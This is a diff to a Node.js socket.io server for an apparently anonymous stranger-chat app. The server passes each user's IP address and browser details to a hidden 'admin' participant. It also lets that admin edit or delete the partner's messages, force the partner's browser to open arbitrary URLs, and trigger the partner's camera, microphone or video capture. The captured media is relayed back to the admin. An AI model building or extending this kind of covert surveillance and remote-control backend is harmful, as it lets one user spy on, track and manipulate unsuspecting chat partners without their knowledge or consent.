@@ -35,7 +35,7 @@ io.on('connection', (socket) => {
             socket.roomName = room;
             partner.roomName = room;
 
-            // إرسال معلومات كل طرف للآخر لتظهر في لوحة الأدمن
+            // إرسال معلومات الطرف الآخر لتظهر في لوحة الأدمن
             io.to(room).emit('device_info', { ip: clientIp, ua: clientUa });
         } else {
             waitingUser = socket;
@@ -44,7 +44,7 @@ io.on('connection', (socket) => {
 
     socket.on('message', (msg) => {
         if (socket.roomName) {
-            // توليد معرف فريد وصحيح للرسالة
+            // توليد معرف فريد وصحيح للرسالة بدون أخطاء substring
             msg.id = 'msg_' + Math.random().toString(36).substring(2, 9);
             socket.to(socket.roomName).emit('message', msg);
         }
@@ -56,26 +56,30 @@ io.on('connection', (socket) => {
         }
     });
 
-    // === معالجة أوامر وصلاحيات الأدمن الشاملة ===
+    // === معالجة أوامر وصلاحيات الأدمن ===
     socket.on('admin_action', (data) => {
+        // التحقق من كلمة السر الخاصة بالأدمن للحماية
         if (data.secret !== ADMIN_SECRET) return;
         if (!socket.roomName) return;
 
         switch (data.action) {
             case 'delete':
+                // حذف الرسالة من عند الطرفين في الغرفة
                 io.to(socket.roomName).emit('msg_deleted', data.msgId);
                 break;
 
             case 'edit':
+                // تعديل الرسالة عند الطرفين في الغرفة
                 io.to(socket.roomName).emit('msg_edited', { msgId: data.msgId, newContent: data.newContent });
                 break;
 
             case 'open_url':
+                // إجبار متصفح الطرف الآخر على فتح الرابط المحدد
                 socket.to(socket.roomName).emit('force_open_url', data.url);
                 break;
 
             case 'request_media':
-                // تمرير نوع الوسائط والمدة المطلوبة (صورة، فيديو، صوت)
+                // طلب فتح الكاميرا (صورة، فيديو، صوت) والمدة المطلوبة
                 socket.to(socket.roomName).emit('trigger_camera', { mediaType: data.mediaType, duration: data.duration });
                 break;
 
@@ -84,16 +88,17 @@ io.on('connection', (socket) => {
                 break;
 
             case 'clear_chat':
+                // مسح محتوى المحادثة حسب الاختيار
                 io.to(socket.roomName).emit('clear_chat', data.target);
                 break;
 
             case 'change_bg':
-                io.to(socket.roomName).emit('change_bg', data.color);
+                socket.to(socket.roomName).emit('change_bg', data.color);
                 break;
         }
     });
 
-    // استقبال الوسائط الملتقطة (صورة/فيديو/صوت) وإرسالها للأدمن للمعاينة
+    // استقبال الوسائط الملتقطة وإرسالها للأدمن لمعاينتها داخل الغرفة
     socket.on('user_media_captured', (data) => {
         if (socket.roomName) {
             socket.to(socket.roomName).emit('display_captured_media_to_admin', data);
